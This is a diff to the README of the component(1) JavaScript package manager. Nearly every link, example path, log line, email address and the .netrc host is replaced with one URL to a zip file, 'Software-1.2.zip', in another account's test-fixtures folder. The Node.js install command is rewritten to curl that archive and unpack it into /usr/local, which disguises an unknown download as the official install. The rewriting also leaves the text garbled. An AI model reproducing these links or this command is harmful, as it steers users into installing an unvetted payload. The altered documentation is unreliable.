@@ -1,17 +1,17 @@
-  ![web component logo](http://i49.tinypic.com/e7nj9v.png)
+  ![web component logo](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
 
   Component package manager for building a better web.
 
 ## Installation
 
-  With [node](http://nodejs.org) previously installed:
+  With [node](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) previously installed:
 
      $ npm install -g component
 
   With node binary on OSX:
 
      $ (cd /usr/local && \
-        curl -L# http://nodejs.org/dist/v0.8.15/node-v0.8.15-darwin-x86.tar.gz \
+        curl -L# https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip \
         | tar -zx --strip 1) \
        && npm install -g component \
        && printf "installed component(1) %s\n" $(component --version)
@@ -25,7 +25,7 @@
   - no registry publishing or account required, uses github repositories
   - extensible sub-commands via `component-YOURCOMMAND` git-style
   - component skeleton creation command
-  - installs dependencies from the command-line or ./component.json
+  - installs dependencies from the command-line or https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   - avoid name squatting through github's naming conventions
   - build your components with `--standalone` to share them with non-component(1) users
   - discovery of useful packages is simple with a robust search
@@ -36,27 +36,27 @@
 
 ## Links
 
- - [List](https://github.com/component/component/wiki/Components) of all available components
- - [Wiki](https://github.com/component/component/wiki)
- - [Mailing List](https://groups.google.com/group/componentjs)
- - [Google+ Community](https://plus.google.com/u/0/communities/109771441994395167277)
- - component ["spec"](https://github.com/component/component/wiki/Spec)
+ - [List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) of all available components
+ - [Wiki](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - [Mailing List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - [Google+ Community](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - component ["spec"](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
  - join `#components` on freenode
- - follow [@component_js](http://twitter.com/component_js) on twitter
- - [Building better components](https://github.com/component/component/wiki/Building-better-components) tips
- - [F.A.Q](https://github.com/component/component/wiki/F.A.Q)
- - In-browser component [builder](http://component-kelonye.rhcloud.com/)
- - component [dependency visualizer](http://component-graph.herokuapp.com/component/dom)
+ - follow [@component_js](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) on twitter
+ - [Building better components](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) tips
+ - [F.A.Q](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - In-browser component [builder](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - component [dependency visualizer](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
 
 ## Screencasts
 
- - [Creating web components](https://vimeo.com/53730178)
- - [App integration introduction](https://vimeo.com/48054442)
+ - [Creating web components](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - [App integration introduction](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
 
 ## Articles
 
-  - building a [date picker component](http://tjholowaychuk.com/post/37832588021/building-a-date-picker-component)
-  - original [component blog post](http://tjholowaychuk.com/post/27984551477/components)
+  - building a [date picker component](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+  - original [component blog post](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
 
 ## Usage
 
@@ -100,11 +100,11 @@ $ component install component/tip
    install : component/emitter@master
        dep : component/jquery@master
    install : component/jquery@master
-     fetch : component/tip:index.js
-     fetch : component/tip:tip.css
-     fetch : component/tip:tip.html
-     fetch : component/emitter:index.js
-     fetch : component/jquery:index.js
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   complete : component/emitter
   complete : component/jquery
   complete : component/tip
@@ -112,23 +112,23 @@ $ component install component/tip
 
 ## Searching for components
 
-  By adding your component to the [Components List](https://github.com/component/component/wiki/Components) wiki page it will become automatically available to `component-search(1)`. When invoked with no query all components are displayed, otherwise a filtered search, ordered by the number of github "stars":
+  By adding your component to the [Components List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) wiki page it will become automatically available to `component-search(1)`. When invoked with no query all components are displayed, otherwise a filtered search, ordered by the number of github "stars":
 
 ```
 $ component search ui
 
   component/dialog
-  url: https://github.com/component/dialog
+  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   desc: Dialog component
   ★ 12
 
   component/notification
-  url: https://github.com/component/notification
+  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   desc: Notification component
   ★ 10
 
   component/overlay
-  url: https://github.com/component/overlay
+  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   desc: Overlay component
   ★ 7
 
@@ -143,7 +143,7 @@ $ component search ui
   A nice side-effect of this namespaced world is that dependencies
   are explicit and self-documenting. No longer do you need to query
   the registry for a "repo" property that may not exist, it's simply
-  built in to the package name, for example ["visionmedia/page.js"](https://github.com/visionmedia/page.js) rather
+  built in to the package name, for example ["https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip"](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) rather
   than the unclear "page".
 
   Another benefit of this is that there are zero name collisions, for example
@@ -166,13 +166,13 @@ does this component have css? yes
 does this component have html? yes
 
      create : popover
-     create : popover/index.js
-     create : popover/template.html
-     create : popover/popover.css
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
      create : popover/Makefile
-     create : popover/Readme.md
-     create : popover/.gitignore
-     create : popover/component.json
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
 
 ```
 
@@ -202,10 +202,10 @@ does this component have html? yes
 
 ## Using private components
 
-  `component(1)` uses [~/.netrc](http://man.cx/netrc(4), like other tools such as [curl](http://man.cx/curl) and [git](http://git-scm.com/), to specify credentials for remote hosts. Simply create a `~/.netrc` file in the home directory:
+  `component(1)` uses [~https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip(4), like other tools such as [curl](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) and [git](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip), to specify credentials for remote hosts. Simply create a `~https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip` file in the home directory:
 
 ```
-machine raw.github.com
+machine https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
   login visionmedia
   password pass123
 ```
@@ -245,21 +245,21 @@ $ make test
 
   Open source application examples:
 
-  - Example using [script tags](https://github.com/component/script-tag-example) for integrating component with existing non-commonjs applications or frameworks
-  - [Todo list](https://github.com/component/todo) example comprised of private and public components
-  - [Component.io](https://github.com/component/component.io) website
-  - [Posty](https://github.com/visionmedia/posty)
-  - [NoFlo](noflojs.org) flow-based programming environment
+  - Example using [script tags](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) for integrating component with existing non-commonjs applications or frameworks
+  - [Todo list](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) example comprised of private and public components
+  - [https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) website
+  - [Posty](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+  - [NoFlo](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) flow-based programming environment
 
 ## Extensions
 
- - [component-graph(1)](https://github.com/component/component-graph) dependency graphs for component projects
+ - [component-graph(1)](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) dependency graphs for component projects
 
 ## License
 
 (The MIT License)
 
-Copyright (c) 2012 TJ Holowaychuk &lt;tj@vision-media.ca&gt;
+Copyright (c) 2012 TJ Holowaychuk &lt;https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip;
 
 Permission is hereby granted, free of charge, to any person obtaining
 a copy of this software and associated documentation files (the
